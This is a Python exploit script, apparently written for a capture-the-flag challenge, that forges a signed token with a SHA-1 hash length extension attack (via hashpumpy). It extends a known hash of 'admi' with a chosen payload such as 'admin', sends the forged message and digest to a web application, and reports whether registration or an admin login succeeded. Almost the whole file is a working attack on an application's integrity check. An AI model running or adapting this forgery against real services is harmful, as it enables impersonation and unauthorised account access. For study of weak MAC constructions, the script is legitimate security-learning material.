from os import stat
import hashpumpy
import urllib.parse
import string
import random
import optparse

from functions import stick_register, stick_login, stick_member, stick_note

domains = ["hotmail.com", "gmail.com", "aol.com",
           "mail.com", "mail.kz", "yahoo.com"]
letters = string.ascii_lowercase[:12]


def get_random_domain(domains):
    return random.choice(domains)


def get_random_name(letters, length):
    return ''.join(random.choice(letters) for _ in range(length))


def generate_random_emails(nb, length):
    return [get_random_name(letters, length) + '%40' + get_random_domain(domains) for _ in range(nb)]


# Create hash extension attack data
def snipe(payload, key_len=16):
    orig = "admi"
    sha1 = "4dd28ad0560441245de6fda3973890eeb41b702d"
    digest, message = hashpumpy.hashpump(sha1, orig, payload, key_len)

    # Process request
    register_user = urllib.parse.quote_from_bytes(message)
    print(f"[{digest} {message} => {register_user}")
    print(register_user)

    status, io_resp = stick_note(register_user, digest, prefix=orig)
    print(f"[{io_resp}] Code: {status}")

    if status == 200:
        resp = ''
        try:
            resp = io_resp.getvalue()
            resp = resp.decode('latin-1')
            if resp.find('Missing') > 0:
                print(f"[{payload}] KO: Missing fields")
            elif resp.find('Invalid') > 0:
                print(f"[{payload}] KO: Invalid fields")
            elif resp.find('User exist') > 0:
                print(f"[{payload}] KO: User exist, try with another email")
            elif resp.find('Registered !') > 0:
                print(f"[{payload}] OK: Registered")
            elif resp.find('Welcome') > 0:
                print(f"[{payload}] OK: Logged in")
                print(resp)
            elif resp.find('email or password empty'):
                print(f"[{payload}] KO: Hash doesn't work")
            else:
                print(resp)
        except Exception as exc:
            print(f"[{payload}] KO: body length {len(resp)} => {exc}")
            print(resp.decode('latin-1'))


def main():
    key_len = 16
    payload = "admin"

    parser = optparse.OptionParser()
    parser.add_option('-p', '--payload', dest='payload', type='string')
    parser.add_option('-l', '--key-length', dest="key_len",
                      type='int', default="16")

    (options, args) = parser.parse_args()
    if (options.payload == None):
        print(parser.usage)
        exit(0)
    else:
        snipe(options.payload, options.key_len)


if __name__ == "__main__":
    main()
